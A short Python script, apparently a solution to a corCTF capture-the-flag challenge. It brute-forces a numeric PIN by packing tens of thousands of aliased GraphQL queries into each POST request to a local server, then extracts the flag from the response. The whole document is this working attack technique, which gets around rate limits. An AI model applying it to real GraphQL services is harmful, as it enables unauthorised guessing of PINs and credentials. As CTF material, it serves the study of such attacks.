import requests
import re

headers = {
    'Content-Type': 'text/plain;charset=UTF-8',
}
url = 'http://localhost:4020/'

for i in range(4):
    query = ''
    print(f'trying from {i * 30000} to {(i + 1) * 30000 - 1}')  # Adjusted the loop range
    
    for x in range(i * 30000, (i + 1) * 30000):
        query += f'flag{x} : flag(pin: {x})\n'
    response = requests.post(url, headers=headers, data=f'{{{query}}}')
    
    if 'corctf{' in response.text:
        flag = re.search(r'corctf\{.*?\}', response.text)
        if flag:
            print(f"Found flag on : {flag.group(0)}") 
            break
